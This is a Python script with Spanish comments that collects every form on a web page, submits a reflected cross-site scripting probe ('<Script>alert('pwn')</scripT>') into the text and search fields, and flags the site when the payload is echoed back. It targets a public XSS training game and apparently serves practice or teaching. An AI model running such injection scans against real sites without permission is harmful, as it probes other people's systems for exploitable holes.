# Importamos la libreria requests que sirve para tramitar peticiones HTTP usando diferentes metodos, asi como extraer informacion
import requests
# Libreria para imprimir datos de manera entendible
from pprint import pprint
# Libreria para extraer datos de una web de forma estructurada, BeatifulSoup representa el documento HTML o XML 
from bs4 import BeautifulSoup as bs
# Libreria que sirve para concatenar cadenas y luego unirlas a una URL en componentes
from urllib.parse import urljoin

# Funcion que recupera la respuesta html a partir de la url proporcionada
def get_all_forms(url):
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form")

# Funcion que recupera toda la informacion potencial del HTML
def get_form_details(form):
    details = {}
    # Obtenemos el valor del atributo 'action', 'method' y las entradas 'inputs[]' del HTML y lo convertimos en minuscula
    action = form.attrs.get("action", "").lower()
    method =form.attrs.get("method", "get").lower()
    inputs = []
    # Bucle for que recorre las inputs_tags del formulario HTML y agregamos esta informacion al arreglo input[]
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    # Se almacena en un diccionario los datos recopilados anteriormente y retornamos el mismo
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

# Funcion a la que pasamos los parametros como el HTML, la URL y el valor que contendra los campos potenciales
def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    # Bucle que recorre el arreglo inputs y verifica que si los campos inyectables son de tipo text o search, seran iguales a value
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            data[input_name] = input_value
    print(f"[+] Enviando payload hacia: {target_url}")
    print(f"[+] Data: {data}")
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)
    

# Funcion que sirve para inyectar el payload, recibe como parametro la URL y aplica el proceso de la funcion get_all_forms
# Al presentarse campos de entrada en los metodos recopilados inyecta el payload js y establecemos una var bool para cambiar su valor si el sitio es vulnerable
def scan_xss(url):
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} form on {url}")
    js_Script = "<Script>alert('pwn')</scripT>"
    is_vulnerable = False
    # Bucle for que recorre el forms aplicado a traves de la funcion get_form_details e inyecta el payload en todos los campos
    for form in forms:
        form_details = get_form_details(form)
        content = submit_form(form_details, url, js_Script).content.decode()
        # Si el payload se encuentra en el content, se imprime el resultado, se cambia la var boole a True y se imprime el campo donde fue inyectado
        if js_Script in content:
            print(f"[+] XSS Detected on {url}")
            print(f"[*] Form details: ")
            pprint(form_details)
            is_vulnerable = True
    return is_vulnerable


# Funcion main que lanza el exploit
if __name__ == "__main__":
    url = "https://xss-game.appspot.com/level1/frame"
    print(scan_xss(url))
